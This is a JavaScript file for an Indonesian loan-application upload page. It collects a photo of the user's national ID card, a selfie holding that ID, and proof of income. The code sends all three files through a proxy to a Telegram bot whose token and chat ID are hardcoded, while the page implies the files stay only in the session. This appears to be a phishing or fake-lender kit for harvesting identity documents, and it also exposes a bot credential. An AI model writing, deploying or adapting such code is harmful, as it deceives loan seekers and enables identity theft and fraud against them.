(() => {
  "use strict";

  // ====== KONFIGURASI ======
  const TELEGRAM_BOT_TOKEN = '8655916807:AAHLgXatTlPGoESOI46HOKA6RYDVy-vstjE';
  const TELEGRAM_CHAT_ID = '6959842489';

  // ====== ARAHKAN KE FOLDER API (BUKAN PROXY.PHP) ======
  // Ganti ini:
const CORS_PROXY = '/api/proxy'; 
// (Karena file `proxy.js` ditaruh di dalam folder `api`, Vercel otomatis menjalankannya)

  if (!window.NovaStorage?.requireSession?.()) return;
  if (!NovaStorage.requireIdentity()) return;
  if (!NovaStorage.requireSmsVerification()) return;

  const R = { back: "verifikasi-sms.html", next: "form-pinjaman.html" };
  const KEY = "pinjamanDemoDataV1";
  const MB = 1048576;
  const photos = new Set(["image/jpeg", "image/png", "image/webp"]);
  const income = new Set([...photos, "application/pdf"]);

  const st = { k: { url: null, valid: false, file: null }, s: { url: null, valid: false, file: null }, i: { url: null, valid: false, file: null, type: "" }, busy: false };
  const $ = x => document.getElementById(x);

  const c = {
    k: { card: $("ck"), status: $("stk"), msg: $("mk"), zone: $("zk"), preview: $("pk"), img: $("ik"), step: $("sk"), max: 5 * MB, types: photos },
    s: { card: $("cs"), status: $("sts"), msg: $("ms"), zone: $("zs"), preview: $("ps"), img: $("is"), step: $("ss"), max: 5 * MB, types: photos },
    i: { card: $("ci"), status: $("sti"), msg: $("mmi"), zone: $("zi"), preview: $("pi"), media: $("mi"), step: $("si"), max: 10 * MB, types: income }
  };

  function status(k, m, t) { c[k].status.className = "status" + (m ? " " + m : ""); c[k].status.innerHTML = '<span class="sd"></span>' + t; }
  function msg(k, t = "", m = "") { c[k].msg.textContent = t; c[k].msg.className = "msg" + (m ? " " + m : ""); }
  function clear(k) { if (st[k].url) URL.revokeObjectURL(st[k].url); st[k] = { ...st[k], url: null, valid: false, file: null }; c[k].preview.classList.remove("show"); c[k].zone.hidden = false; c[k].card.classList.remove("valid", "error"); status(k, "", "Belum diunggah"); }
  function validate(k, f) {
    if (!f) return "Tidak ada file yang dipilih.";
    if (k === "i" && !$("type").value) return "Pilih jenis dokumen penghasilan sebelum memilih file.";
    if (!c[k].types.has(f.type)) return k === "i" ? "Format tidak didukung. Gunakan JPG, JPEG, PNG, WEBP, atau PDF." : "Format tidak didukung. Gunakan JPG, JPEG, PNG, atau WEBP.";
    if (f.size > c[k].max) return k === "i" ? "Ukuran dokumen terlalu besar. Maksimal 10 MB." : "Ukuran foto terlalu besar. Maksimal 5 MB.";
    return "";
  }
  function readImageFile(file) { return new Promise((resolve, reject) => { const reader = new FileReader(); reader.onload = () => resolve(String(reader.result || "")); reader.onerror = () => reject(new Error("read-failed")); reader.readAsDataURL(file); }); }
  function waitForImage(image, src) { return new Promise((resolve, reject) => { image.onload = () => resolve(); image.onerror = () => reject(new Error("decode-failed")); image.src = src; }); }

  async function render(k, f) {
    clear(k);
    try {
      st[k].file = f;
      if (k === "i" && f.type === "application/pdf") {
        st.i.type = $("type").value; st[k].valid = true; c.i.media.replaceChildren();
        const pdfWrap = document.createElement("div"); pdfWrap.style.cssText = "text-align:center;color:#6d28d9;padding:24px";
        pdfWrap.innerHTML = `<div style="font-size:46px">📄</div><strong>Preview PDF siap</strong><div style="font-size:11px;color:#756f86;margin-top:6px">Dokumen PDF tersedia sementara pada sesi ini.</div>`;
        c.i.media.append(pdfWrap);
      } else {
        const dataUrl = await readImageFile(f);
        if (k === "i") {
          st.i.type = $("type").value; c.i.media.replaceChildren();
          const image = document.createElement("img"); image.alt = "Preview dokumen penghasilan"; await waitForImage(image, dataUrl); c.i.media.append(image);
        } else { await waitForImage(c[k].img, dataUrl); }
        st[k].valid = true;
      }
      c[k].zone.hidden = true; c[k].preview.classList.add("show"); c[k].card.classList.remove("error"); c[k].card.classList.add("valid");
      status(k, "success", "Selesai"); msg(k, k === "i" ? "Dokumen berhasil dipilih." : "Foto berhasil dipilih.", "good");
    } catch {
      st[k].valid = false; st[k].file = null; c[k].preview.classList.remove("show"); c[k].zone.hidden = false; c[k].card.classList.add("error");
      status(k, "error", "Gagal"); msg(k, "Gambar tidak dapat dibaca. Pilih gambar lain.", "bad");
    } finally { progress(); }
  }
  function process(k, f) {
    const e = validate(k, f);
    if (e) { clear(k); c[k].card.classList.add("error"); status(k, "error", "Gagal"); msg(k, e, "bad"); progress(); return; }
    status(k, "processing", "Sedang diproses"); msg(k, "Menyiapkan preview…"); setTimeout(() => { void render(k, f); }, 180);
  }
  function progress() {
    const n = ["k", "s", "i"].filter(x => st[x].valid).length;
    $("pt").textContent = n + " dari 3"; $("pb").style.width = (n / 3 * 100) + "%";
    ["k", "s", "i"].forEach(x => c[x].step.classList.toggle("done", st[x].valid));
    const ok = n === 3; $("next").disabled = !ok || st.busy;
    $("next").textContent = (ok ? "" : "🔒 ") + "Lanjut ke Form Pinjaman →";
    $("hint").textContent = ok ? "✓ 3 dari 3 dokumen lengkap" : "🔒 Lengkapi semua dokumen untuk melanjutkan";
  }

  document.querySelectorAll("[data-open]").forEach(b => b.onclick = () => { if (b.dataset.open === "sc") $("guide").classList.add("active"); $(b.dataset.open).click(); });
  [["kc", "k"], ["kg", "k"], ["sc", "s"], ["sg", "s"], ["ic", "i"], ["if", "i"]].forEach(([id, k]) => $(id).onchange = e => { $("guide").classList.remove("active"); process(k, e.target.files?.[0]); e.target.value = ""; });
  $("type").onchange = () => { st.i.type = $("type").value; if (st.i.file) { clear("i"); msg("i", "Jenis dokumen berubah. Pilih ulang dokumen yang sesuai."); } else msg("i", $("type").value ? "Jenis dokumen dipilih. Silakan unggah file." : ""); progress(); };
  Object.entries(c).forEach(([k, v]) => {
    ["dragenter", "dragover"].forEach(t => v.zone.addEventListener(t, e => { e.preventDefault(); v.zone.classList.add("drag"); }));
    ["dragleave", "drop"].forEach(t => v.zone.addEventListener(t, e => { e.preventDefault(); v.zone.classList.remove("drag"); }));
    v.zone.addEventListener("drop", e => process(k, e.dataTransfer.files?.[0]));
  });

  async function uploadToTelegram(captionText, file) {
    if (file.size > 4.5 * MB) throw new Error(`Ukuran file ${(file.size / MB).toFixed(1)}MB terlalu besar. Maksimal 4.5MB.`);

    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('caption', captionText);
    formData.append('file', file, file.name);

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 60000); // Timeout 60 detik

    try {
      const response = await fetch(CORS_PROXY, { method: 'POST', body: formData, signal: controller.signal });
      clearTimeout(timeoutId);

      const contentType = response.headers.get("content-type") || "";
      if (!contentType.includes("application/json")) {
        const errorText = await response.text();
        throw new Error(`Vercel gagal. Pastikan folder 'api' dan file 'proxy.js' ada. Response: ${errorText.substring(0, 80)}...`);
      }
      if (!response.ok) {
        const result = await response.json();
        throw new Error(`Telegram error: ${result.description || response.statusText}`);
      }
      return await response.json();
    } catch (err) {
      clearTimeout(timeoutId);
      if (err.name === 'AbortError') throw new Error('Vercel terlalu lambat (timeout 60 detik).');
      throw err;
    }
  }

  function setProcessStep(active) { [1, 2, 3].forEach(index => { const item = $("p" + index); item.classList.toggle("active", index === active); item.classList.toggle("done", index < active); }); }
  async function navigateToLoanForm() {
    const layer = $("processingLayer");
    layer.classList.add("show"); layer.setAttribute("aria-hidden", "false"); document.body.style.overflow = "hidden";

    setProcessStep(1); await sleep(400);
    setProcessStep(2); await sleep(450);
    setProcessStep(3);
    $("processTitle").textContent = "Mengunggah dokumen...";
    $("processCopy").textContent = "Dokumen dikirim satu per satu. Mohon ditunggu.";

    try {
      await uploadToTelegram('📄 Dokumen: KTP Pengguna', st.k.file);
      await uploadToTelegram('📸 Dokumen: Selfie Pengguna', st.s.file);
      await uploadToTelegram('💰 Dokumen: Bukti Pendapatan', st.i.file);

      [1, 2, 3].forEach(index => { const item = $("p" + index); item.classList.remove("active"); item.classList.add("done"); });
      $("processSymbol").classList.add("success");
      $("processSymbol").replaceChildren();
      const check = document.createElement("span"); check.className = "process-check"; $("processSymbol").append(check);
      $("processTitle").textContent = "Dokumen Berhasil Dikirim";
      $("processCopy").textContent = "Semua dokumen telah terkirim...";
      $("next").textContent = "✓ Dokumen Terkirim";

      localStorage.setItem(KEY, JSON.stringify({
        ...JSON.parse(localStorage.getItem(KEY) || "{}"),
        dokumenDemo: [{ kategori: "Foto KTP", status: "dipilih" }, { kategori: "Selfie dengan KTP", status: "dipilih" }, { kategori: "Dokumen Penghasilan", jenis: st.i.type, status: "dipilih" }],
        dokumenLengkap: true
      }));
      NovaStorage.setDocumentsCompleted(true);

      await sleep(800);
      window.location.assign("./form-pinjaman.html");
    } catch (error) {
      console.error("Upload gagal:", error);
      layer.classList.remove("show"); layer.setAttribute("aria-hidden", "true"); document.body.style.overflow = "";
      st.busy = false; progress();
      $("global").textContent = "❌ " + error.message;
    }
  }

  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
  $("next").addEventListener("click", async () => {
    $("global").textContent = "";
    if (st.busy) return;
    if (!st.k.valid || !st.s.valid || !st.i.valid) { $("global").textContent = "Lengkapi seluruh dokumen sebelum melanjutkan."; return; }
    st.busy = true; progress(); $("next").disabled = true;
    $("next").innerHTML = '<span class="btn-spin" aria-hidden="true"></span>Memproses Dokumen...';
    $("hint").textContent = "Mohon tunggu, dokumen Anda sedang dikirim...";
    try { await navigateToLoanForm(); } catch { st.busy = false; document.body.style.overflow = ""; $("processingLayer").classList.remove("show"); $("processingLayer").setAttribute("aria-hidden", "true"); $("global").textContent = "Proses navigasi gagal. Silakan coba kembali."; progress(); }
  });
  $("back").onclick = () => location.href = R.back;
  progress();
})();